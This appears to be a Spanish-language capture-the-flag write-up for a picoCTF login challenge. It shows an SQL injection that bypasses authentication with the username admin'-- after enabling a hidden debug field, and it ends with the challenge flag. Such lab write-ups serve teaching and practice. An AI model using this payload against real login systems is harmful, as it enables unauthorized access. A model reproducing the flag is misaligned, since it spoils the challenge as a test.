## Descripción
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:61345](http://fickle-tempest.picoctf.net:61345/).
## Solución
```
Entramos a la página y abrimos el formulario de login desde `Admin Login`.
Después inspeccionamos el código del formulario y encontramos el siguiente campo oculto:
<inpt type="hidden" name="debug" value="0">

Modificamos el valor de `debug` de `0` a `1` desde el inspector del navegador:

<inpt type="hidden" name="debug" value="1">

Luego colocamos el siguiente usuario:

admin'--

Y en la contraseña podemos escribir cualquier cosa:

a

Al iniciar sesión, la página muestra la consulta SQL:

sql
SELECT * FROM users WHERE name='admin'--' AND password='a'

El `--` comenta la parte de la contraseña, por lo que la consulta valida solamente al usuario `admin`.

Solución:
picoCTF{s0m3_SQL_85832275}

```
## Notas adicionales
-  La vulnerabilidad es una inyección SQL en el campo `username`.
## Referencias